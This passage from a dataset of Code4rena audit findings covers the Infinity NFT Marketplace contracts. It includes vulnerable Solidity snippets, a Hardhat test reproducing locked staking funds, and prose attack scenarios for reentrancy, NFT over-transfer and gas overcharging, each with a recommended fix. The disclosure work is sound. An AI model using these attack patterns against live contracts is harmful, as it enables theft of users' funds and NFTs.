      "content": "_Submitted by WatchPug, also found by 0xsanson, and shenwilly_\n\n```solidity\nuint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n// if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n// else we need to send the protocol fee separately in the execution currency\nif (buy.execParams[1] == weth) {\n  IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n} else {\n  IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n  IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n}\n```\n\nIn the current design/implementation, while the order is executed by the `MATCH_EXECUTOR`, the gas cost will always be paid by the maker order's buyer.\n\nWhile the buyer did agreed to pay a certain price for certain NFTs, the actual cost for that maker buy order is unpredictable: because the `MATCH_EXECUTOR` can choose to execute the order while the network is extremly busy and the gas price is skyhigh.\n\nAs the gas cost at whatever gas price will be reimbursed by the buyer, the executor has no incentive to optimize and choose to execute the order at a lower gas cost.\n\nThe result is the buyer can sometimes end up paying much higher total price (incl. gas cost) for the items they bought.\n\n### Impact\n\nWhile this is more of a design issue than a wrong implementation, the impact can be very severe for some users, and can cause defacto fund loss to the users who have they maker buy orders matched at a high gas price transactions.\n\n### Recommendation\n\nConsider adding a new paramer to maker buy orders, `maxGasCost` to allow the buyer to limit the max gas they agreed to pay.\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/257#issuecomment-1160618955):**\n> We have considered this issue and decided to handle it offchain. The offchain matching engine does not send txns if gas costs are high by default. While this involves some trust, we wanted to simplify the UX for users. \n> \n> In any case, it is trivial for us to add the max gas preference setting offchain on the UI and the matching engine will respect that. \n> \n> We can consider adding this preference to the orderType itself in a future implementation.\n> \n> As such, the bug can be classified as low risk but I leave it up to more experienced judges.\n> \n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/257#issuecomment-1179578358):**\n> Thank you for the detailed response here @nneverlander!\n> \n> Due to the gas refund logic highlighted by the warden here, users could end up spending their entire balance (or amount approved) unexpectedly. I understand that this could be handled with off chain logic but a bug in that system could have significant impact on users. Since it is just a single trusted actor that could cause damage here - I believe this is a Medium risk issue due to the \"external requirements\" such as a bug in the off chain matcher.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code for the Infinity Exchange smart contract. The code allows for the gas cost of an order to be paid by the buyer of the order, regardless of the gas price. This means that the buyer can end up paying more than they agreed to for the order due to high gas prices. This can lead to significant losses for the buyer. The recommendation is to add a parameter to the maker buy order, maxGasCost, to allow the buyer to limit the max gas they are willing to pay.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/257",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "WatchPug",
        "shenwilly",
        "0xsanson"
      ]
    },
    {
      "id": "2778",
      "title": "[M-01] InfinityExchange computes gas refunds in a way where the first order's buyer pays less than the later ones",
      "impact": "MEDIUM",
      "content": "_Submitted by Ruhum, also found by 0xf15ers, 0xsanson, antonttc, kenzo, and WatchPug_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L149>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L273>\n\n### Impact\n\nThe way the gas refunds are computed in the InfinityExchange contract, the first orders pay less than the latter ones. This causes a loss of funds for the buyers whose orders came last in the batch.\n\n### Proof of Concept\n\nThe issue is that the `startGasPerOrder` variable is computed within the for-loop. That causes the first iterations to be lower than later ones.\n\nHere's an example for the following line: <https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202>\nTo make the math easy we use the following values:\n\n    startGas = 1,000,000\n    gasPerOrder = 100,000 (so fulfilling an order costs us 100,000 gas)\n    ordersLength = 10\n\nFor the 2nd order we then get:\n\n    startGasPerOrder = 900,000 + ((1,000,000 + 20,000 - 900,000) / 10)\n    startGasPerOrder = 912,000\n\nFor the 9th order we get:\n\n    startGasPerOrder = 200,000 + ((1,000,000 + 20,000 - 200,000) / 10)\n    startGasPerOrder = 282,000\n\nThe `startGasPerOrder` variable is passed through a couple of functions without any modification until it reaches a line like this: <https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L231>\n\n```sol\nuint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n```\n\nThere, the actual gas costs for the user are computed.\n\nIn our case, that would be:\n\n    # 2nd order\n    # gasleft() is 800,00 because we said that executing the order costs ~100,000 gas. At the beginning of the order, it was 900,000 so now it's 800,000. This makes the computation a little more straightforward although it's not 100% correct.\n    gasCost = (912,000 - 800,000 + 50,000) * 1\n    gasCost = 162,000\n\n    # 9th order\n    gasCost = (282,000 - 100,000 + 50,000) * 1\n    gasCost = 232,000\n\nSo the 2nd order's buyer pays `162,000` while the 9th order's buyer pays `232,000`.\n\nAs I said the math was dumbed down a bit to make it easier. The actual difference might not be as big as shown here. But, there is a difference.\n\n### Recommended Mitigation Steps\n\nThe `startGasPerOrder` variable should be initialized *outside* the for-loop.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/82#issuecomment-1162872661):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/5a3f81b82a9bee2de7517b3a5f18953cb5ec3684\n> \n> Agree with risk assessment.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/82#issuecomment-1179582713):**\n > When multiple orders are processed in batch, some users pay more than their expected share of gas costs.\n> \n> Although the impact may be relatively small values, this appears to be a common path and would result in taking more value than expected from many users during normal usage. Rating this a Medium risk issue as it leaks value impacting users who are not first in a batch transaction.\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the InfinityExchange contract, in which the first orders pay less than the latter ones, causing a loss of funds for the buyers whose orders came last in the batch. This is due to the way the gas refunds are computed in the contract, as the `startGasPerOrder` variable is computed within the for-loop. To illustrate this, an example is given using the following values: startGas = 1,000,000, gasPerOrder = 100,000, and ordersLength = 10. For the 2nd order, the startGasPerOrder is 912,000 while for the 9th order, it is 282,000. This results in the 2nd order's buyer paying 162,000 while the 9th order's buyer pays 232,000. The recommended mitigation step for this issue is to initialize the `startGasPerOrder` variable outside the for-loop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/82",
      "tags": [],
      "finders": [
        "0xsanson",
        "0xf15ers",
        "Ruhum",
        "WatchPug",
        "antonttc",
        "kenzo"
      ]
    },
    {
      "id": "2777",
      "title": "[H-11] Reentrancy from `matchOneToManyOrders`",
      "impact": "HIGH",
      "content": "_Submitted by kenzo, also found by 0xDjango_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230>\n\n### Vulnerability Details\n\n`matchOneToManyOrders` doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent.\nUsing this, a malicious user can re-enter the contract and re-fulfill the order using `takeOrders`.\n\n### Impact\n\nOrders can be executed twice. User funds would be lost.\n\n### Proof of Concept\n\n`matchOneToManyOrders` will set the order nonce as used only after the tokens are being sent:\n\n      function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {\n        ...\n        if (makerOrder.isSellOrder) {\n          for (uint256 i = 0; i < ordersLength; ) {\n            ...\n            _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n        } else {\n          for (uint256 i = 0; i < ordersLength; ) {\n            protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n          ...\n      }\n\nSo we can see that tokens are being transferred before nonce is being set to executed.\n\nTherefore, POC for an attack -\nAlice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token.\nMalicious user Bob will set up an offer to sell 2 WolfNFT.\nThe MATCH_EXECUTOR will match the offers.\nBob will set up a contract such that upon receiving of AMP, it will call [`takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs.\n(Note that although `takeOrders` is `nonReentrant`, `matchOneToManyOrders` is not, and so the reentrancy will succeed.)\n\nSo in `takeOrders`, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then `matchOneToManyOrders` execution will resume, and again will set Alice's order's nonce to true.\n\nAlice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.\n\n(Note: a similar attack can be constructed via ERC721's onERC721Received.)\n\n### Recommended Mitigation Steps\n\nConform to CEI and set the nonce to true before executing external calls.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1162891402):**\n > Fixed in: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/b90e746fa7af13037e7300b58df46457a026c1ac\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1179805097):**\n > Great catch! Agree with the assessment.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the 'matchOneToManyOrders' function of the 'InfinityExchange' smart contract. The issue is that the function does not conform to the Check-Effects-Interactions (CEI) pattern, and updates the maker order nonce only after the Non-Fungible Tokens (NFTs) and payment have been sent. This means that a malicious user can re-enter the contract and re-fulfill the order using 'takeOrders'. This can result in a user's funds being lost as orders can be executed twice. \n\nA proof of concept (POC) is provided which outlines a scenario where Alice wants to buy 2 unspecified WolfNFTs and pays via AMP, an ERC-777 token. Malicious user Bob sets up an offer to sell 2 WolfNFTs. The MATCH_EXECUTOR matches the offers, and Bob sets up a contract which calls 'takeOrders' with Alice's order and 2 other WolfNFTs. This is possible as 'matchOneToManyOrders' is not non-reentrant. As a result, Alice ends up buying 4 WolfNFTs instead of the 2 she signed up for.\n\nThe recommended mitigation step is to conform to CEI and set the nonce to true before executing external calls.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/184",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "0xDjango",
        "kenzo"
      ]
    },
    {
      "id": "2776",
      "title": "[H-10] Sellers may lose NFTs when orders are matched with `matchOrders()`",
      "impact": "HIGH",
      "content": "_Submitted by KIntern, also found by csanuragjain, GimelSec, kenzo, and unforgiven_\n\nFunction `matchOrders` uses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.\n\nBut in [function](https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L192) `areNumItemsValid()`, there is a wrong checking will lead to wrong logic in `matchOrders()` function.\n\nInstead of checking if `numConstructedItems <= sell.constraints[0]` or not, function `areNumItemsValid()` check if `buy.constraints[0] <= sell.constraints[0]`. It will lead to the scenario that `numConstructedItems > sell.constraints[0]` and make the seller sell more number of nfts than he/she allow.\n\n### Proof of Concept\n\nConsider the scenario\n\n1.  Alice create a sell order to sell maximum 2 in her 3 BAYC with ids `[1, 2, 3]`\n2.  Bob create a buy order to buy mimimum any 2 BAYC with id in list `[1, 2, 3]`\n3.  Match executor call `matchOrders()` to match Alice's order and Bob's one with parameter `constructs = [1, 2, 3]`\n4.  Function `matchOrders` will transfer all NFT in `construct` list (3 NFTs `1, 2, 3`) from seller to buyer even though seller only want to sell maximum 2 NFTs.\n\nFor more information, please check this PoC.\n<https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878>\n\n### Tools Used\n\nHardhat, Chai\n\n### Recommended Mitigation Steps\n\nReplace check `buy.constraints[0] <= sell.constraints[0]` with `numConstructedItems <= sell.constraints[0]`\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/164#issuecomment-1163505913)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/164#issuecomment-1179746706):**\n > Seller's may specify a max number of NFTs to sell, but in the scenario outlined by the warden that requirement is not enforced - leading to the sale of more NFTs than authorized.\n> \n> Accepting this as a High risk report.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the function `matchOrders` of the InfinityOrderBookComplication.sol contract. This function allows sellers and buyers to specify the maximum and minimum number of Non-Fungible Tokens (NFTs) they want to sell/buy. However, in the function `areNumItemsValid()` there is a wrong check which leads to wrong logic in the `matchOrders()` function. Instead of checking if `numConstructedItems <= sell.constraints[0]`, the function checks if `buy.constraints[0] <= sell.constraints[0]`. This can lead to the scenario where `numConstructedItems > sell.constraints[0]` and the seller is forced to sell more NFTs than they intended. \n\nTo illustrate this vulnerability, consider the scenario where Alice creates a sell order to sell maximum 2 of her 3 BAYC with ids `[1, 2, 3]` and Bob creates a buy order to buy any 2 BAYC with ids in the list `[1, 2, 3]`. When the `matchOrders()` function is called with the parameter `constructs = [1, 2, 3]`, all 3 NFTs `1, 2, 3` will be transferred from the seller to the buyer, even though the seller only wanted to sell a maximum of 2 NFTs. \n\nTo fix this vulnerability, the check `buy.constraints[0] <= sell.constraints[0]` should be replaced with `numConstructedItems <= sell.constraints[0]`. The tools used to test this vulnerability were Hardhat and Chai.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/164",
      "tags": [],
      "finders": [
        "csanuragjain",
        "KIntern",
        "unforgiven",
        "GimelSec",
        "kenzo"
      ]
    },
    {
      "id": "2775",
      "title": "[H-09] Calling `unstake()` can cause locked funds",
      "impact": "HIGH",
      "content": "_Submitted by Ruhum, also found by 0xDjango, auditor0517, dipp, GimelSec, GreyArt, p4st13r4, and wagmi_\n\nFollowing scenario:\n\nAlice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls `unstake(X)` to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.\n\n### Proof of Concept\n\nFirst, here's a test showcasing the issue:\n\n```js\n  describe('should cause trouble', () => {\n    it('should lock up funds', async function () {\n      await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked, 2);\n      await network.provider.send(\"evm_increaseTime\", [181 * DAY]);\n      await network.provider.send('evm_mine', []);\n      \n      // The funds we staked for 6 months have vested\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // Now we want to stake funds for three months\n      await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked2, 1);\n\n      // total staked is now the funds staked for three & six months\n      // total vested stays the same\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // we unstake the funds that are already vested.\n      const userBalanceBefore = await token.balanceOf(signer1.address);\n      await infinityStaker.connect(signer1).unstake(amountStaked);\n      const userBalanceAfter = await token.balanceOf(signer1.address);\n\n      expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));\n\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));\n    });\n  });\n```\n\nThe test implements the scenario I've described above. In the end, the user got back their `amountStaked` tokens with the `amountStaked2` tokens being locked up in the contract. The user has no tokens staked at the end.\n\nThe issue is in the `_updateUserStakedAmounts()` function:\n\n```sol\n    if (amount > noVesting) {\n      userstakedAmounts[user][Duration.NONE].amount = 0;\n      userstakedAmounts[user][Duration.NONE].timestamp = 0;\n      amount = amount - noVesting;\n      if (amount > vestedThreeMonths) {\n        // MAIN ISSUE:\n        // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.\n        // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;\n        userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;\n        amount = amount - vestedThreeMonths;\n        // `amount == vestedSixMonths` so we enter the else block\n        if (amount > vestedSixMonths) {\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;\n          userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;\n          amount = amount - vestedSixMonths;\n          if (amount > vestedTwelveMonths) {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;\n          } else {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;\n          }\n        } else {\n          // the staked amount is set to `0`.\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;\n        }\n      } else {\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;\n      }\n    } else {\n      userstakedAmounts[user][Duration.NONE].amount -= amount;\n    }\n```\n\n### Recommended Mitigation Steps\n\nDon't set `userstakedAmounts.amount` to `0` if none of its tokens are removed (`vestedAmount == 0`)\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1163063584)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1179743567):**\n > When unstaking, unvested tokens may become locked in the contract forever.\n> \n> Accepting this as a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a smart contract code that can cause funds to be locked up. The vulnerability is present in the 'InfinityStaker.sol' contract and is located between lines 290 and 325. The issue is demonstrated in a test case, which showcases the scenario where Alice has staked X tokens for 6 months that have vested, and then stakes Y tokens for another 3 months. If she then calls 'unstake(X)' to take out the tokens that have vested, the Y tokens she staked for 3 months will be locked up. The issue is in the '_updateUserStakedAmounts()' function, where the current staked tokens are set to 0 and the amount is decreased by 0. This should not happen if the vested amount is 0. The recommended mitigation step is to not set 'userstakedAmounts.amount' to 0 if none of its tokens are removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/50",
      "tags": [],
      "finders": [
        "GreyArt",
        "auditor0517",
        "0xDjango",
        "Ruhum",
        "dipp",
        "p4st13r4",
        "wagmi",
        "GimelSec"
      ]
    },
    {
      "id": "2774",
      "title": "[H-08] Overpayment of native ETH is not refunded to buyer",
      "impact": "HIGH",
      "content": "_Submitted by horsefacts, also found by 0x29A, antonttc, berndartmueller, byterocket, cccz, codexploder, dipp, GimelSec, GreyArt, Lambda, oyc_109, Ruhum, and unforgiven_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232>\n\n### Vulnerability Details\n\n`InfinityExchange` accepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.\n\nIn the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function of `block.timestamp`, and the user cannot predict the timestamp at which their transaction will be included.\n\nIn a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.\n\nThe `takeOrders` and `takeMultipleOneOrders` functions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:\n\n[`InfinityExchange#takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363)\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\n[`InfinityExchange#takeMultipleOneOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327)\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\nHowever, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.\n\nMoreover, since there is a bug in `rescueETH` that prevents ether withdrawals from `InfinityExchange`, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.\n\nScenario:\n\n*   Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price `500`, end price `2000`, start time `1`, end time `5`.\n*   Bob fills the order at time `2`. The calculated price is `875`. Bob is unsure when his transaction will be included, so provides a full `2000` wei payment.\n*   Bob's transaction is included at time `3`. The calculated price is `1250`.\n*   Bob's additional `750` wei are locked in the contract and not refunded.\n\nSuggestion: Calculate and refund overpayment amounts to callers.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/244#issuecomment-1160526998):**\n > Agree with the assessment, fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/a605b72e44256aee76d80ae1652e5c98c855ffd3\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/244#issuecomment-1179719920):**\n > In the case of a Dutch auction, precise pricing is unknown at the time a tx is broadcasted. This leads to users overpaying and the surplus is taken as exchange fees instead of being refunded.\n> \n> Accepting as a High risk submission.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the InfinityExchange smart contract, which accepts payments in native ETH but does not return overpayments to the buyer. Overpayments are likely to occur in the case of auction orders priced in native ETH, such as Dutch and reverse Dutch auctions. The functions `takeOrders` and `takeMultipleOneOrders` check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution, however, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance, and due to a bug in `rescueETH`, these overpayments will be locked permanently. \n\nTo illustrate this, an example is given of Alice creating a sell order for her token with reverse Dutch auction constraints, and Bob filling the order at time `2` with a payment of `2000` wei. Bob's transaction is included at time `3` when the calculated price is `1250`, leaving an overpayment of `750` wei which is locked in the contract and not refunded. \n\nThe suggestion is to calculate and refund overpayment amounts to callers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/244",
      "tags": [],
      "finders": [
        "GreyArt",
        "codexploder",
        "cccz",
        "unforgiven_",
        "Ruhum",
        "berndartmueller",
        "Lambda",
        "antonttc",
        "byterocket",
        "dipp",
        "0x29A",
        "oyc109",
        "horsefacts",
        "GimelSec"
      ]
    },
    {
      "id": "2773",
      "title": "[H-07] `_transferNFTs()` succeeds even if no transfer is performed",
      "impact": "HIGH",
      "content": "_Submitted by k, also found by 0x29A, 0xf15ers, 0xsanson, antonttc, hyh, PwnedNoMore, and zzzitron_\n\nIf an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases:\n\n1.  A token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly.\n2.  An NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces.\n3.  A malicious contract that is deployed to take advantage of this behavior.\n\n### Proof of Concept\n\n<https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9>\n\n### Recommended Mitigation Steps\n\nIf neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1162963184):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1179596601):**\n> If `supportsInterface` returns false for both 721 & 1155 then no NFT is transferred but funds are still sent to the seller.\n> \n> A number of NFTs do not fully comply with the 721/1155 standards. Since the order is not canceled or the tx reverted, this seems like a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange.sol contract code on GitHub. If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. This means that the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This vulnerability can occur in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly; 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces; and 3. a malicious contract that is deployed to take advantage of this behavior. A proof of concept is provided to demonstrate the vulnerability. The recommended mitigation steps are to either revert if neither the ERC-721 nor the ERC-1155 interface is supported, or to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/87",
      "tags": [
        "ERC721",
        "ERC1155"
      ],
      "finders": [
        "0xsanson",
        "0xf15ers",
        "k",
        "antonttc",
        "zzzitron",
        "0x29A",
        "hyh",
        "PwnedNoMore"
      ]
    },
    {
      "id": "2772",
      "title": "[H-06] Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`",
      "impact": "HIGH",
      "content": "_Submitted by PwnedNoMore_\n\nMany real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.\n\nFor example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d\\&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).\n\nAssuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n```\n\nThe code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support ERC721 interface. Then,\n\n```solidity\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n```\n\nSince the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item ([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.\n\nThat means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.\n\nNote that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.\n\n### Proof of Concept\n\nCheck the return values of [Sandbox's 